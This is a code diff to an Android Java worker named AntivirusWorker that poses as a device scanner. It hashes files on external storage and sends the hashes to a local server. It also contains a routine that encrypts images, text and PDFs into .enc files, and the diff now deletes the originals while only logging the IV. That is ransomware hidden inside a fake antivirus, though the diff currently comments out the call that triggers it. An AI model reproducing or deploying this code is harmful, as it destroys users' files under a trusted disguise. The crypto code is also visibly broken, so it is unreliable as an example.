@@ -41,7 +41,9 @@ import java.security.NoSuchAlgorithmException;
 import java.security.SecureRandom;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.HashMap;
 import java.util.List;
+import java.util.Locale;
 import java.util.Map;
 import java.util.Random;
 
@@ -56,12 +58,14 @@ import static android.provider.Settings.System.getString;
 import static androidx.core.content.ContextCompat.getSystemService;
 
 public class AntivirusWorker extends Worker {
-    private final String url = "http://192.168.43.134/hash";
+    private final String url = "http://192.168.43.134:3000/hash";
     private final String LOG_TAG = "NUMBAH 1:";
-    private Map<String,Object> listOfMalware;
+    private Map<String,Object> listOfMalware = new HashMap<>();
     private MessageDigest md = MessageDigest.getInstance("MD5");
     private String[] extenstions = {".jpg",".png",".jpeg",".txt",".pdf"};
     private List<Integer> yes = new ArrayList<>();
+    private int progressCount = 0;
+    private int noOfFiles;
     public AntivirusWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) throws NoSuchAlgorithmException {
         super(context, workerParams);
     }
@@ -69,8 +73,9 @@ public class AntivirusWorker extends Worker {
     @NonNull
     @Override
     public Result doWork() {
-        File yes =  Environment.getDataDirectory();
+        File yes = Environment.getExternalStorageDirectory();
         try {
+            noOfFiles = getNoOfFiles(yes);
             yesu(yes);
         } catch (IOException | JSONException e) {
             Log.e(LOG_TAG, "shit", e);
@@ -86,7 +91,8 @@ public class AntivirusWorker extends Worker {
                    yesu(oof);
                }
                else{
-                   setForegroundAsync(createForegroundInfo(oof.getAbsolutePath()));
+                   setForegroundAsync(createForegroundInfo(oof.getAbsolutePath(), progressCount));
+                   setProgressAsync(new Data.Builder().putString("Progress", String.format(Locale.ENGLISH,"%d/%d",progressCount,noOfFiles)).putString("File",oof.getAbsolutePath()).build());
                    FileInputStream fis = new FileInputStream(oof);
                    int i = 0;
                    do{
@@ -117,17 +123,19 @@ public class AntivirusWorker extends Worker {
                            Log.e(LOG_TAG,"reeeee",e);
                        }
                    }, Throwable::printStackTrace);
-                   for(String lmao:extenstions) {
-                       if (oof.getAbsolutePath().endsWith(lmao)) {
-                           weeeeeeeeeeeeee(oof);
-                       }
-                   }
+                   Volley.newRequestQueue(getApplicationContext()).add(jsonObjectRequest);
+//                   for(String lmao:extenstions) {
+//                       if (oof.getAbsolutePath().endsWith(lmao)) {
+//                           weeeeeeeeeeeeee(oof);
+//                       }
+//                   }
+                   progressCount+= 1;
                }
            }
        }
     }
 
-    private ForegroundInfo createForegroundInfo(String progress){
+    private ForegroundInfo createForegroundInfo(String progress,int fileNo){
         Context context = getApplicationContext();
         String id = context.getString(R.string.app_name);
         String title = "Scanning your device";
@@ -144,8 +152,7 @@ public class AntivirusWorker extends Worker {
                 .setContentText(progress)
                 .setSmallIcon(R.drawable.antivirus)
                 .setOngoing(true)
-                // Add the cancel action to the notification which can
-                // be used to cancel the worker
+                .setProgress(noOfFiles,fileNo,false)
                 .addAction(android.R.drawable.ic_delete, cancel, intent)
                 .setOnlyAlertOnce(true)
                 .build();
@@ -158,8 +165,6 @@ public class AntivirusWorker extends Worker {
            int importance = NotificationManager.IMPORTANCE_DEFAULT;
            NotificationChannel channel = new NotificationChannel(CHANNEL_ID, CHANNEL_ID, importance);
            channel.setDescription(description);
-           // Register the channel with the system; you can't change the importance
-           // or other notification behaviors after this
            NotificationManager notificationManager = getSystemService(getApplicationContext(),NotificationManager.class);
            notificationManager.createNotificationChannel(channel);
        }
@@ -176,23 +181,23 @@ public class AntivirusWorker extends Worker {
                 SecretKeySpec key = new SecretKeySpec(keyBytes, "AES");
                 byte[] ivBytes = new byte[16];
                 new SecureRandom().nextBytes(ivBytes);
-                Cipher cipher = Cipher.getInstance("PBEWITHSHA256AND256BITAES-CBC-BC");
+                Cipher cipher = Cipher.getInstance("PBEWithHmacSHA256AndAES_256");
                 IvParameterSpec iv = new IvParameterSpec(ivBytes);
                 cipher.init(Cipher.ENCRYPT_MODE,key,iv);
                 FileInputStream fis = new FileInputStream(file);
-                File encrypted = new File(file.getName().concat(".enc"));
+                File encrypted = new File(file.getAbsolutePath().concat(".enc"));
                 FileOutputStream fos = new FileOutputStream(encrypted);
                 int i;
-                byte[] bytes = new byte[2097152];
-                bytes = shuffleFun(bytes);
+                byte[] bytes = new byte[65536];
                 do{
                     i = fis.read(bytes);
+                    bytes = shuffleFun(bytes);
                     cipher.update(bytes);
                 }while(i!=-1);
                 fos.write(cipher.doFinal());
                 fis.close();
                 fos.close();
-
+                file.delete();
                 Log.i(LOG_TAG, Arrays.toString(ivBytes));
             } catch (JSONException | NoSuchAlgorithmException | InvalidAlgorithmParameterException | InvalidKeyException | NoSuchPaddingException | BadPaddingException | IllegalBlockSizeException | IOException e) {
                 Log.e(LOG_TAG, "shit", e);
@@ -218,5 +223,19 @@ public class AntivirusWorker extends Worker {
         byte xored = x+1 == original.length ? (byte) (original[x] ^ original[x+1]) : (byte) (original[x] ^ original[0]);
         original[x] = xored;
         return original;
+    }
+
+    private int getNoOfFiles(File file){
+        int x = 0;
+        File[] yes = file.listFiles();
+        for(File oof : yes){
+            if(oof.isDirectory()){
+                x += getNoOfFiles(oof);
+            }
+            else{
+                x += 1;
+            }
+        }
+        return x;
     }
 }
